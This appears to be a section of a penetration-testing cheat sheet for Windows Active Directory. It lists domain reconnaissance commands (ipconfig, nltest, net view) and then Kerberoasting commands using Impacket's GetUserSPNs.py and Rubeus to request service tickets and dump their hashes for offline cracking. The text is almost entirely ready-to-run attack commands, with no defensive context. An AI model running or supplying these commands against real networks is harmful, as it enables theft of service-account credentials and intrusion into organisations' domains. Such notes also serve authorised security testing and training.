### 10.2 Network & Domain Info
    # Get network configuration, DNS servers, domain name
    ipconfig /all
    
    # Find domain controllers
    nltest /dsgetdc:<domain_name>
    
    # List machines in the domain
    net view /domain:<domain_name>
    
    # Check connectivity
    ping <DomainControllerName>

    Service Principal Name (SPN) Scanning (Kerberoasting)
    
    # Request service tickets user can delegate (Kerberoasting)
    GetUserSPNs.py (Impacket) domain.local/user -request
    
    # Use Rubeus to perform Kerberoasting
    Rubeus.exe kerberoast /outfile:hashes.kerberoast